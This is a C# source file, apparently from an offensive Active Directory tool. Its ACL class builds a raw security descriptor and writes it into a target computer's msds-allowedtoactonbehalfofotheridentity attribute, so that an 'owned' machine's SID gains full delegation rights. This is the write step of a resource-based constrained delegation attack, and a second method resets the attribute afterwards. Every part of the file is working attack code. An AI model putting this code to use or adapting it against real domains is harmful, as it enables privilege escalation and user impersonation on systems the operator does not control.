using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.AccessControl;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;
using System.DirectoryServices.Protocols;
using System.Security.Cryptography;

namespace Framework.lib2
{
    internal class ACL
    {
        private string domain;
        private string username;
        private string password;
        private DirectoryEntry rootEntry;
        private PrincipalContext context;

        public ACL(string domain = null, string username = null, string password = null)
        {
            this.domain = (domain == null) ? Domain.GetCurrentDomain().Name : domain;
            this.username = username;
            this.password = password;
            if (this.username == null || this.password == null)
            {
                this.rootEntry = new DirectoryEntry("LDAP://" + this.domain);
                this.context = new PrincipalContext(ContextType.Domain, this.domain);
            }
            else
            {
                this.rootEntry = new DirectoryEntry("LDAP://" + this.domain, this.username, this.password);
                this.context = new PrincipalContext(ContextType.Domain, this.domain, this.username, this.password);
            }
        }

        public byte[] createACL(string rights, string SID)
        {
            Console.WriteLine("Creating ACL {0} for object with SID {1} ...", rights, SID);
            RawSecurityDescriptor securityDescriptor = new RawSecurityDescriptor(rights + SID + ")");
            byte[] SDBytes = new byte[securityDescriptor.BinaryLength];
            securityDescriptor.GetBinaryForm(SDBytes, 0);
            Console.WriteLine("ACL created\n");
            return SDBytes;
        }

        public bool setMachineOnBehalfFromMachineName(string target, string owned)
        {
            ADScan scanner = new ADScan();
            DirectorySearcher searcher = new DirectorySearcher(this.rootEntry);
            searcher.Filter = "(&(objectClass=computer)(|(SAMAccountName=" + target + "$)))";
            Console.WriteLine("Adding msds-allowedtoactonbehalfofotheridentity attribute to machine {0}...\n", target);
            byte[] SDBytes = createACL("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;", scanner.getMachineSID(owned));
            try
            {
                foreach (SearchResult result in searcher.FindAll())
                {
                    DirectoryEntry computer = result.GetDirectoryEntry();
                    computer.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = SDBytes;
                    computer.CommitChanges();
                }
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        public bool setMachineOnBehalfFromSDBytes(string target, byte[] SDBytes)
        {
            ADScan scanner = new ADScan();
            DirectorySearcher searcher = new DirectorySearcher(this.rootEntry);
            searcher.Filter = "(&(objectClass=computer)(|(SAMAccountName=" + target + "$)))";
            Console.WriteLine("Resetting msds-allowedtoactonbehalfofotheridentity attribute to machine {0}...\n", target);
            try
            {
                foreach (SearchResult result in searcher.FindAll())
                {
                    DirectoryEntry computer = result.GetDirectoryEntry();
                    computer.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = SDBytes;
                    computer.CommitChanges();
                }
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }
    }
}
